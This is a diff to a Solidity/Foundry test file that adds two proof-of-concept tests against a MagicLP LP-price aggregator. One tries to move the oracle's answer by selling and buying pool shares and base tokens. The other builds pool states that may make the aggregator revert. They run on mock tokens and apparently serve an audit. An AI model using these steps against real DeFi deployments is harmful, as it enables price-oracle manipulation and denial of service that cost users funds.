@@ -3,15 +3,19 @@ pragma solidity ^0.8.13;
 
 import "utils/BaseTest.sol";
 import "/oracles/aggregators/MagicLpAggregator.sol";
+import {MagicLpAggregator} from "/oracles/aggregators/MagicLpAggregator.sol";
 import {console2} from "forge-std/console2.sol";
 import {MagicLP} from "/mimswap/MagicLP.sol";
 import {ERC20Mock} from "./mocks/ERC20Mock.sol";
 import {FeeRateModel} from "/mimswap/auxiliary/FeeRateModel.sol";
+import {FixedPointMathLib} from "@solady/utils/FixedPointMathLib.sol";
 import {IFeeRateModel} from "/mimswap/interfaces/IFeeRateModel.sol";
 import {IFactory} from "/mimswap/interfaces/IFactory.sol";
+import {IMagicLP} from "/mimswap/interfaces/IMagicLP.sol";
 import {IWETH} from "/interfaces/IWETH.sol";
 import {IAggregator} from "/interfaces/IAggregator.sol";
 import {Factory} from "/mimswap/periphery/Factory.sol";
+import {PMMPricing} from "/mimswap/libraries/PMMPricing.sol";
 import {Router} from "/mimswap/periphery/Router.sol";
 import {MagicLPLens} from "/lenses/MagicLPLens.sol";
 
@@ -215,5 +219,130 @@ contract MagicLpAggregatorTest is BaseTest {
             uint256(aggregator.latestAnswer()),
             0.01 ether
         );
+    }
+
+    function test_poc_inflate_lp_price() public {
+        baseToken.mint(address(this), 10 ether);
+        quoteToken.mint(address(this), 600000 ether);
+        baseToken.approve(address(router), 10 ether);
+        quoteToken.approve(address(router), 600000 ether);
+
+        (address cloneAddress, ) = router.createPool(
+            address(baseToken),
+            address(quoteToken),
+            MIN_LP_FEE_RATE,
+            60000 ether,
+            1 ether,
+            address(this),
+            10 ether,
+            600000 ether,
+            false
+        );
+        clone = MagicLP(cloneAddress);
+        uint shareBalAfter = clone.balanceOf(address(this));
+        assertEq(shareBalAfter, clone.totalSupply() - 1001);
+
+        MockPriceAggregator basePriceAggregator = new MockPriceAggregator(60000 ether, 18);
+        MockPriceAggregator quotePriceAggregator = new MockPriceAggregator(1 ether, 18);
+        MagicLpAggregator aggregator = new MagicLpAggregator(IMagicLP(cloneAddress), basePriceAggregator, quotePriceAggregator);
+
+        console2.log();
+        console2.log("################ ANSWER AFTER LIQUIDITY ADDED ######################");
+        basePriceAggregator.setPrice(int256(lens.getMidPrice(cloneAddress)));
+        console2.log("<magiclp> base reserve #0:", clone._BASE_RESERVE_());
+        console2.log("<magiclp> quote reserve #0:", clone._QUOTE_RESERVE_());
+        console2.log("<test latest answer> #0 uint256(aggregator.latestAnswer()):", uint256(aggregator.latestAnswer()));
+        console2.log("######################################");
+
+        console2.log();
+        console2.log("################ SELL ALL AVAILABLE SHARES ######################");
+        clone.sellShares(shareBalAfter, address(this), 0, 0, "", type(uint256).max);
+        basePriceAggregator.setPrice(int256(lens.getMidPrice(cloneAddress)));
+        console2.log("<magiclp> midprice #1:", int256(lens.getMidPrice(cloneAddress)));
+        console2.log("<magiclp> base reserve #1:", clone._BASE_RESERVE_());
+        console2.log("<magiclp> quote reserve #1:", clone._QUOTE_RESERVE_());
+        console2.log("<test latest answer> #1 uint256(aggregator.latestAnswer()):", uint256(aggregator.latestAnswer()));
+        console2.log("######################################");
+
+        console2.log();
+        console2.log("################ BUY MORE SHARES ######################");
+        quoteToken.mint(cloneAddress, 1e18);
+        baseToken.mint(cloneAddress, 1e18);
+        clone.buyShares(address(this));
+        console2.log("<magiclp> midprice #2:", int256(lens.getMidPrice(cloneAddress)));
+        console2.log("<magiclp> base reserve #2:", clone._BASE_RESERVE_());
+        console2.log("<magiclp> quote reserve #2:", clone._QUOTE_RESERVE_());
+        // basePriceAggregator.setPrice(int256(lens.getMidPrice(cloneAddress)));
+        uint answerBeforeSale = uint256(aggregator.latestAnswer());
+        console2.log("<test latest answer> #2 uint256(aggregator.latestAnswer()):", uint256(aggregator.latestAnswer()));
+        console2.log("######################################");
+
+        console2.log();
+        console2.log("################### SELL SOME BASE TOKEN ###################");
+        baseToken.mint(cloneAddress, 1e12);
+        clone.sellBase(address(this));
+        // basePriceAggregator.setPrice(int256(lens.getMidPrice(cloneAddress)));
+        uint answerAfterSale = uint256(aggregator.latestAnswer());
+        console2.log("<test latest answer> #3 uint256(aggregator.latestAnswer()):", uint256(aggregator.latestAnswer()));
+        console2.log("######################################");
+
+        assertApproxEqRel(answerAfterSale, answerBeforeSale, 0.0000000001 ether);
+    }
+
+    function test_poc_aggregator_dos_cleaned() public {
+        uint baseDepositAmount = 1e18;
+        uint quoteDepositAmount = 3e18;
+        uint k = 1 ether;
+        uint sellBaseAmount = 0.1e18;
+        uint sellQuoteAmount = 0.1e18;
+
+        baseToken.mint(address(this), baseDepositAmount);
+        quoteToken.mint(address(this), quoteDepositAmount);
+        baseToken.approve(address(router), baseDepositAmount);
+        quoteToken.approve(address(router), quoteDepositAmount);
+        uint256 i = uint256(baseDepositAmount).divWad(quoteDepositAmount);
+        try
+            router.createPool(
+                address(baseToken),
+                address(quoteToken),
+                MIN_LP_FEE_RATE,
+                i,
+                k,
+                address(this),
+                baseDepositAmount,
+                quoteDepositAmount,
+                false
+            )
+        returns (address cloneAddress, uint256) {
+            clone = MagicLP(cloneAddress);
+        } catch {
+            vm.assume(false);
+        }
+
+        baseToken.mint(address(clone), sellBaseAmount);
+        try clone.sellBase(address(this)) {} catch {
+            vm.assume(false);
+        }
+
+        quoteToken.mint(address(clone), sellQuoteAmount);
+        try clone.sellQuote(address(this)) {} catch {
+            vm.assume(false);
+        }
+
+        PMMPricing.PMMState memory pmmState = clone.getPMMState();
+        console2.log(pmmState.B, pmmState.Q, pmmState.B0, pmmState.Q0);
+
+        MockPriceAggregator basePriceAggregator;
+        try lens.getMidPrice(address(clone)) returns (uint256 price) {
+            basePriceAggregator = new MockPriceAggregator(int256(price), 18);
+        } catch {
+            vm.assume(false);
+        }
+
+        MockPriceAggregator quotePriceAggregator = new MockPriceAggregator(1 ether, 18);
+        vm.assume(uint256(k).mulWad(uint256(basePriceAggregator.latestAnswer())) > 1e8);
+        MagicLpAggregator aggregator = new MagicLpAggregator(IMagicLP(address(clone)), basePriceAggregator, quotePriceAggregator);
+
+        aggregator.latestAnswer();
     }
 }
